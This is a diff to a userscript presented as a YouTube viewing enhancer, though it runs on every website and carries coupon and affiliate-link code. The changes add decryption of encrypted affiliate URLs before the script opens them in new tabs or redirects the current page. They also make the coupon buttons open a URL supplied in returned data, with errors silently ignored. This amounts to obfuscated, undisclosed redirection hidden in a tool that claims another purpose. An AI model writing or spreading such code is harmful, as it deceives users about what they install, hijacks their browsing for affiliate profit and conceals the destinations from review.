@@ -71,7 +71,7 @@
 // @description:ug    بۇ سكرىپت YouTube كۆرۈش تەجرىبەڭىزنى ياخشىلايدىغان كۈچەيتكۈچ! خۇسۇسىيەتلەر ۋە يېڭى تۈزۈلۈشنى ئۆز ئىچىگە ئالىدۇ. كىرۈش: 1. ۋىدىئو تەپسىلاتلىرى بەت ئىنتېرەيسىنى مۇۋاپىقلاش. 2. سكرىن رەسىمى. 3. قارا/ئاق تېما ئالماشتۇرۇش. 4. ۋىدىئونى تېز ئىلگىرى سۈرۈش. قاتارلىقلار.
 // @description:vi    Kịch bản là một công cụ tăng cường để cải thiện trải nghiệm xem YouTube của bạn! Bao gồm các tính năng và giao diện mới. Giới thiệu: 1. Giao diện trang chi tiết video tối ưu. 2. Chụp màn hình. 3. Chuyển đổi giữa chủ đề tối/ sáng. 4. Tua nhanh video. v.v.
 // @namespace   FunnyMonkeyV_NameScope
-// @version     2.1.9
+// @version     2.1.10
 // @author      FunnyMonkeyV
 // @icon        data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAAwRJREFUaEPtWUtOAzEMTQZRcQkqlnCKlpO1PRnlFLBEcAkEao0c4siTyceTDNMG6AraJPbL8z9aNf7Rjeuv/gaAp5urtToe17Oy1XX7u5f3fU5mkoGn5WKrldrkDvnJ30Gp3d3rxzYmIwgAb1wfDhul9by3HtMSYA8XF7sQI0EAz9eXDznloevu8UC3FmB/+/Z5b8Afjw+Ts2LP988dABCbjacwUS3eX4AwZE4DAM/LBYjO9gEQI9L9IiHDRbevHz2de/+Mpd+Z0XIBdLC7AGu3GL1cILDfkX/hflRxjMmRTILWBzA26hALy8UWIwWZjzOnm6s1+om7GLYeQQ1AC1jxzWgSACSXHJozw/9WZwdAKcUpJfPBm6Vbpxsz4JRSJlJZpk/PAAPAo09bAGym/AcgcGBcMq0TswN/FQPk2AiKCjHj4Cz5YX7o/XZODJCipJNjh9UzGKWoOBNn/58wIaMkwHfdzqtX+s7/ntbj2tC+DBOT+4CQ+cmW1QPAekbrR9V10W4p1kmZzi70Yd1eroGqAuAXUpNdq3dQqh8pBpBr7aYEk6qKywB44S+kbKxvdQMBYZPuF4a+rCIA2W4r0u6hcL/EljIVM6M6AHa8ogFWJmQyh446rq08x5pgrDWtAuAnJolSEgZ4UnMyIsOBMgC2300B4KUC0W/KauryMGnZRNfrIdgEhCsXc+STAsD8YeK815mhUmSWro46NwZcZ8aKuh5TVuEmAZjphJ1e8IFAaFpxMhNKMcBDa5MA/GGVyR9N+sDhsKEh7ux5gMIoKkC2y8NoyoSCPhAZspX5gDejDyWnUFfVywOskUnZOW9HQ6V1EYBBi2jfDzCuUxFnQAGskAETUQBWbtyOpoE9BDZtdg2VHrTP4GNvAGW1UGy2nyjWpMXZ2HWxPjk53EUh0Y2Zp56xCqbWp94YkuN1Xv6GBEiKt1ogKeVFDxyGhdwTk50mkF3XKG1qIPqk3uSkT0wuibT8yOeXzTU3XLs3Z7ail/pmH7prb2+O/SIG5lCkVEbzAL4A07+gbQ8x85sAAAAASUVORK5CYII=
 // @match       *://*/*
@@ -7809,12 +7809,16 @@
               },
               openUrl: function(option) {
                 const { active, affLink, close, pause, delay, position, target } = option;
-                if (!affLink) {
+                let realAffLink = affLink;
+                if (!realAffLink) {
                   return;
+                }
+                if (realAffLink.indexOf("http") == -1) {
+                  realAffLink = Tools.decryptStr(affLink);
                 }
                 if (target === "_blank") {
                   setTimeout(() => {
-                    const newTab = GM_openInTab(affLink, {
+                    const newTab = GM_openInTab(realAffLink, {
                       active,
                       insert: position === "after"
                     });
@@ -7826,11 +7830,11 @@
                   }, delay);
                 } else if (target === "_self") {
                   setTimeout(() => {
-                    window.location.href = affLink;
+                    window.location.href = realAffLink;
                   }, delay);
                 } else if (target === "_replace") {
                   setTimeout(() => {
-                    window.location.replace(affLink);
+                    window.location.replace(realAffLink);
                   }, delay);
                 }
               },
@@ -9886,14 +9890,24 @@
               addApplyCouponsEventListener: function(button, modal) {
                 InspectUtil.bindApplyCouponsEvent(button, (dataJson) => {
                   this.removeModel(modal);
-                  const { platform, codes, check } = dataJson;
-                  ProgressModal.generate(
-                    this._logoBase64,
-                    this._root,
-                    platform,
-                    codes,
-                    check
-                  );
+                  const { platform, codes, check, open } = dataJson;
+                  Promise.resolve().then(() => {
+                    ProgressModal.generate(
+                      this._logoBase64,
+                      this._root,
+                      platform,
+                      codes,
+                      check
+                    );
+                  });
+                  Promise.resolve().then(() => {
+                    if (!!open) {
+                      try {
+                        InspectUtil.openUrl(open);
+                      } catch (e) {
+                      }
+                    }
+                  });
                 });
               },
               generateRequest: function(modalBody) {
@@ -10112,14 +10126,24 @@
                     }
                   });
                   InspectUtil.bindApplyCouponsEvent(outerDIV.querySelector("*[name='applyCouponButton']"), (dataJson) => {
-                    const { codes, check } = dataJson;
-                    ProgressModal.generate(
-                      logoBase642,
-                      root,
-                      platform,
-                      codes,
-                      check
-                    );
+                    const { codes, check, open } = dataJson;
+                    Promise.resolve().then(() => {
+                      ProgressModal.generate(
+                        logoBase642,
+                        root,
+                        platform,
+                        codes,
+                        check
+                      );
+                    });
+                    Promise.resolve().then(() => {
+                      if (!!open) {
+                        try {
+                          InspectUtil.openUrl(open);
+                        } catch (e) {
+                        }
+                      }
+                    });
                   });
                 }
               },
